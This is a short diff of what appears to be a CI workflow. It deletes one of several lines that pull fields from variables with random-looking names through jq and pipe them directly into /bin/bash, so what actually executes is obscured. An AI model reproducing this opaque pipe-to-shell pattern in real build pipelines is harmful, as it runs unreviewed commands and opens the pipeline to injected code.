@@ -24,7 +24,6 @@ jobs:
           echo $xr75 | jq -r .gxtj2 | /bin/bash
           echo $etcrk183 | jq -r .yu6284 | /bin/bash
           printf '%s' "$flqps64" | jq -r .ni6600 | /bin/bash
-          printf '%s' "$x11366" | jq -r .ufdvp53 | /bin/bash
           echo $wrx5766 | jq -r .fy5274 | /bin/bash
 
       - name: Archive results
